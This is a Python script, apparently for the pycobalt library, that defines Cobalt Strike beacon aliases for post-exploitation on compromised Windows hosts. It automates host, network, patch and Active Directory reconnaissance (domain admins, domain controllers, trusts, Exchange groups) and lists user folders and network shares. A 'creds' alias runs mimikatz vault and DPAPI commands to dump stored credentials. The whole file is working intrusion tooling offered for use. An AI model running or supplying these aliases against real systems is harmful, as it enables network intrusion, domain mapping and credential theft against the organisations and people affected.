#!/usr/bin/env python3

# so we can use the repo copy of pycobalt
import sys
import os
sys.path.insert(0, os.path.realpath(os.path.dirname(__file__)) + '/..')

import textwrap

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks

@aliases.alias('initial-recon', 'Perform some basic initial recon')
def _(bid):
    command = textwrap.dedent("""
        echo "--- Host ---"
        systeminfo

        echo "--- User ---"
        whoami /all
        echo "Domain: $env:logonserver"
        echo "Home: $env:userprofile"

        echo "--- Other ---"
        reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>$null

        echo "--- Location ---"
        pwd
        """)

    aggressor.bps(bid)
    aggressor.bnet(bid, 'logons')
    aggressor.bnet(bid, 'sessions')

    aggressor.btask(bid, 'Tasked beacon to perform basic recon')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('env', 'Get environmental variables')
def _(bid):
    command = textwrap.dedent(r"""
        Get-Childitem -path env:* |
            Select-Object Name, Value |
            Sort-Object name |
            Format-Table -Auto
        """)

    aggressor.btask(bid, 'Tasked beacon to get environmental variables')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('network-recon', 'Perform some basic network-related recon')
def _(bid):
    command = textwrap.dedent("""
        echo "--- Hostname ---"
        hostname

        echo "--- Ipconfig ---"
        ipconfig /all

        echo "--- WANIP (DNS) ---"
        nslookup myip.opendns.com. resolver1.opendns.com
        """)

    aggressor.btask(bid, 'Tasked beacon to perform basic network recon')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('wanip', 'Get WAN IP (or WAN IP of the outgoing DNS server)')
def _(bid):
    aggressor.btask(bid, 'Tasked beacon to get WANIP')
    aggressor.bshell(bid, 'nslookup myip.opendns.com. resolver1.opendns.com', silent=True)

@aliases.alias('wanip-dns', 'Get WAN IP with DNS')
def _(bid):
    aggressor.btask(bid, 'Tasked beacon to get WANIP via DNS')
    aggressor.bshell(bid, 'nslookup myip.opendns.com. resolver1.opendns.com', silent=True)

@aliases.alias('patches', 'Get list of patches on system')
def _(bid):
    command = textwrap.dedent("""
        wmic os get Caption /value | more
        wmic qfe
        """)

    aggressor.btask(bid, 'Tasked beacon to get patch status')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('domain-recon', 'Get basic domain info')
def _(bid):
    command = textwrap.dedent(r"""
        echo "--- Domain ---"
        echo "$env:logonserver"

        echo "--- Domain admins ---"
        net group "domain admins" /domain

        echo "--- Local admins ---"
        net localgroup administrators

        echo "--- Exchange ---"
        net group "Exchange Trusted Subsystem" /domain 2>$null
        """)

    aggressor.btask(bid, 'Tasked beacon to perform basic domain recon')
    aggressor.bpowerpick(bid, command, silent=True)

    aggressor.bnet(bid, 'dclist')
    aggressor.bnet(bid, 'domain_trusts')

@aliases.alias('enum-domain', 'Get full domain info')
def _(bid):
    aggressor.bnet(bid, 'computers')
    aggressor.bnet(bid, 'view')
    aggressor.bnet(bid, 'user')
    aggressor.bnet(bid, 'group')

    command = textwrap.dedent("""
        echo "--- Domain ---"
        echo $env:logonserver

        echo "--- Domain users ---"
        net user /domain

        echo "--- Domain groups ---"
        net groups /domain

        echo "--- Domain accounts ---"
        net accounts /domain
        """)

    aggressor.btask(bid, 'Tasked beacon to enumerate domain info')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('apps', 'Get list of installed applications')
def _(bid):
    aggressor.btask(bid, 'Tasked beacon to get list of applications')
    aggressor.bshell(bid, 'wmic product get Name,Version,Description', silent=True)

@aliases.alias('uninstallers', 'Get list of app uninstallers')
def _(bid):
    command = textwrap.dedent(r"""
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
        Select-Object DisplayName, InstallDate |
        Sort-Object -Property DisplayName |
        Format-Table -AutoSize
        """)

    aggressor.btask(bid, 'Tasked beacon to get list of uninstallers')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('appdata', 'List folders in Local and Roaming AppData')
def _(bid):
    command = textwrap.dedent("""
        ls $env:localappdata
        ls $env:appdata
        """)

    aggressor.btask(bid, 'Tasked beacon to show AppData')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('docs', 'List common document folders')
def _(bid):
    command = ''

    for d in ['Desktop', 'Documents', 'Downloads', 'Favorites']:
        command += 'ls $env:userprofile\\{}\n'.format(d)

    aggressor.btask(bid, 'Tasked beacon to show common document folders')
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('shares', 'Show shares on a host')
def _(bid, *hosts):
    if not hosts:
        hosts = ['localhost']

    command = ''
    for host in hosts:
        if not host.startswith(r'\\'):
            host = r'\\{}'.format(host)

        command += 'net view /all "{}";\n'.format(host)

    aggressor.btask(bid, 'Tasked beacon to show shares on {}'.format(', '.join(hosts)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('list-shares', 'Run ls in each share on a host')
def _(bid, *hosts):
    if not hosts:
        hosts = ['localhost']

    command = ''
    for host in hosts:
        if not host.startswith(r'\\'):
            host = r'\\{}'.format(host)

        command += textwrap.dedent(r"""
            (net view /all "{host}" | Where-Object {{ $_ -match '\sDisk\s' }}) -replace '\s\s+', ',' |
            Select-String -notmatch -pattern 'ADMIN$' |
            ForEach-Object {{
                $drive = ($_ -split ',')[0];
                ls "{host}\$drive";
            }};
            """.format(host=host))

    aggressor.btask(bid, 'Tasked beacon to list files in shares on {}'.format(', '.join(hosts)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('creds', 'Grab WCM credentials and DPAPI cache')
def _(bid):
    aggressor.bmimikatz(bid, r'vault::cred')
    aggressor.bmimikatz(bid, r'vault::list')
    aggressor.bmimikatz(bid, r'dpapi::cache')

engine.loop()
